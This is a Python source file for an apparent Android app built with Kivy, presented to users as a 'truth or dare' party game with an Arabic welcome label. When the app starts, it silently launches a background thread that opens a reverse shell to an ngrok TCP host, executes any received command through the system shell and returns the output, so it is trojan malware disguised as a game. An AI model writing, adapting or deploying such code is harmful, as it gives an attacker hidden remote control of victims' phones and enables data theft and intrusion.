import socket
import subprocess
import os
import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

# إعدادات ngrok المستخرجة من شاشتك
HOST = '2.tcp.eu.ngrok.io'
PORT = 15825

def run_client():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            while True:
                command = s.recv(1024).decode('utf-8')
                if not command:
                    break
                
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(b"Changed directory successfully\n")
                    except Exception as e:
                        s.send(str(e).encode('utf-8'))
                    continue

                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output)
        except Exception:
            pass

class TruthOrDareApp(App):
    def build(self):
        t = threading.Thread(target=run_client)
        t.daemon = True
        t.start()
        
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        self.label = Label(text="مرحباً بك في تطبيق جلسة صراحة\nاختار سؤال أو صراحة مع أصدقائك!", font_size=20)
        layout.add_widget(self.label)
        return layout

if __name__ == '__main__':
    TruthOrDareApp().run()
